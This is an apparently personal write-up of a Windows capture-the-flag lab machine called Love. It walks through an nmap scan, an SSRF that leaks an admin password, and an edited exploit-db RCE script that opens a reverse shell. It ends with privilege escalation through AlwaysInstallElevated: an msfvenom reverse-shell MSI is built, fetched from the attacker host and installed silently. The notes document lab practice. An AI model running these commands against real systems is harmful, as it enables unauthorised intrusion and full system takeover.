

## Lab Details
- Difficulty: Easy
- OS: Windows

## Summary
- Initial access: SSRF
- Privilege escalation: Abuse AlwaysInstallEvelated

## Enumeration
#### Steps
- run `nmap`
```bash
$ nmap 10.129.48.103 -p- -sC -sV -A -T4
Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-03 20:04 EDT
Nmap scan report for 10.129.48.103
Host is up (0.0023s latency).
Not shown: 65516 closed tcp ports (conn-refused)
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
|_http-title: Voting System using PHP
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
443/tcp   open  ssl/http     Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
|_http-title: 403 Forbidden
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
| ssl-cert: Subject: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in
| Not valid before: 2021-01-18T14:00:16
|_Not valid after:  2022-01-18T14:00:16
445/tcp   open  microsoft-ds Windows 10 Pro 19042 microsoft-ds (workgroup: WORKGROUP)
3306/tcp  open  mysql        MariaDB 10.3.24 or later (unauthorized)
5000/tcp  open  http         Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
|_http-title: 403 Forbidden
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
5040/tcp  open  unknown
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
5986/tcp  open  ssl/http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_ssl-date: 2026-06-04T00:30:03+00:00; +21m33s from scanner time.
| tls-alpn: 
|_  http/1.1
|_http-title: Not Found
| ssl-cert: Subject: commonName=LOVE
| Subject Alternative Name: DNS:LOVE, DNS:Love
| Not valid before: 2021-04-11T14:39:19
|_Not valid after:  2024-04-10T14:39:19
7680/tcp  open  pando-pub?
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
49670/tcp open  msrpc        Microsoft Windows RPC
Service Info: Hosts: www.example.com, LOVE, www.love.htb; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2026-06-04T00:29:49
|_  start_date: N/A
|_clock-skew: mean: 2h06m33s, deviation: 3h30m01s, median: 21m32s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 10 Pro 19042 (Windows 10 Pro 6.3)
|   OS CPE: cpe:/o:microsoft:windows_10::-
|   Computer name: Love
|   NetBIOS computer name: LOVE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2026-06-03T17:29:50-07:00

```
## Foothold

#### Steps
- Enumerate the web services 
- Identified Free File Scanner application running on port 80 with host name `staging.love.htb`
- It provides a function to check if a file contain virus 
- Testing out the functionality it seems to display the output the file that its inputted i.e. `http://local:8000/test`
![[Pasted image 20260604084935.png]]
- It doesnt execute exe files or web shell commands 
- Attempt to enumerate internal ports 
```
http://127.0.0.1:5000
```
- Identified admin credential for Vote Admin which is application running on port 80 without the host name 
![[Pasted image 20260604084846.png]]

```
admin : @LoveIsInTheAir!!!!
```

- Attempted login directly as well as brute forcing the voter's ID to no prevail 
![[Pasted image 20260604085904.png]]
- Searching online and found exploit for authenticated RCE https://www.exploit-db.com/exploits/49445
- Need to modify the payload to match the target file paths
```
$ cat exp1.py 
import requests

# --- Edit your settings here ----
IP = "10.129.48.103" # Website's URL
USERNAME = "admin" #Auth username
PASSWORD = '@LoveIsInTheAir!!!!' # Auth Password
REV_IP = "10.10.14.17" # Reverse shell IP
REV_PORT = "8888" # Reverse port 
# --------------------------------

INDEX_PAGE = f"http://{IP}/index.php"
LOGIN_URL = f"http://{IP}/login.php"
VOTE_URL = f"http://{IP}/admin/voters_add.php"
CALL_SHELL = f"http://{IP}/images/shell.php"
<SNIP>
```
- Run the exploit and receive a reverse shell
```
$ nc -lvnp 8888
Listening on 0.0.0.0 8888
Connection received on 10.129.48.103 64803
b374k shell : connected

Microsoft Windows [Version 10.0.19042.867]
(c) 2020 Microsoft Corporation. All rights reserved.

C:\xampp\htdocs\omrs\images>
```
## Lateral Movement 

#### Steps

## Privilege Escalation

#### Steps
- Load and run `winpeas.exe`
- Identified `AlwaysInstalledElevated` set to 1 which means any MSI can be run with system privileges 
```
### Checking AlwaysInstallElevated
    AlwaysInstallElevated set to 1 in HKLM!
    AlwaysInstallElevated set to 1 in HKCU!
```
- Use msfvenom to generate a reverse shell executable masked as `msi`
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=eth0 LPORT=1234 -f msi > nickvourd.msi
```
- Load and execute
```
PS C:\Users\Phoebe\Desktop> wget http://10.10.14.17:8000/rev.msi -o ./rev.msi                             
wget http://10.10.14.17:8000/rev.msi -o ./rev.msi
PS C:\Users\Phoebe\Desktop> ls
ls


    Directory: C:\Users\Phoebe\Desktop


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----          6/3/2026   6:37 PM         159744 rev.msi                                                              
-ar---          6/3/2026   5:25 PM             34 user.txt                                                             
-a----          6/3/2026   6:34 PM       11131392 winpeas.exe                                                          


PS C:\Users\Phoebe\Desktop> msiexec /quiet /qn /i rev.msi
msiexec /quiet /qn /i rev.msi
```
- A reverse shell received as system
```
$ nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.129.48.103 64811
Microsoft Windows [Version 10.0.19042.867]
(c) 2020 Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>whoami
whoami
nt authority\system
```


## Lessons Learned
- Attack family:
- Key takeaway:

## Resources
- References: